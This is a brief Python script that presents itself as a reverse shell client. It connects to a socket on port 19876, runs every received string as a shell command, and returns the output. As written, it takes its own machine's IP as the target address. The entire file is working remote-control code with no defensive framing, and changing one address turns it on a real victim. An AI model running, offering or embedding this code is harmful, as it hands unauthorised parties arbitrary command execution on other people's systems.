import os
import socket
import subprocess
import sys

print("Run this on the machine you want reverse shell of")
host_name = socket.gethostname()
ip = socket.gethostbyname(host_name)

def receiver(s):
    """Receive system commands and execute them."""
    while True:
        cmd_bytes = s.recv(4096) # 4096 is better for heavy transfers!
        cmd = cmd_bytes.decode("utf-8")
        if cmd.startswith("cd "):
            os.chdir(cmd[3:])
            s.send(b"$: ")
            continue
        if len(cmd) > 0:
            p = subprocess.run(cmd, shell=True, capture_output=True)
            data = p.stdout + p.stderr
            s.sendall(data + b"$: ")

def connect(address):
    """Establish a connection to the address, then call receiver()"""
    try:
        s = socket.socket()
        s.connect(address)
        print("[*] Connection Established")
        print(f"[*] Address: {address}")
    except socket.error as error:
        print("[-] Something went wrong")
        print(error)
        sys.exit()
    receiver(s)

if __name__ == "__main__":
    host = ip
    port = 19876
    connect((host, port))
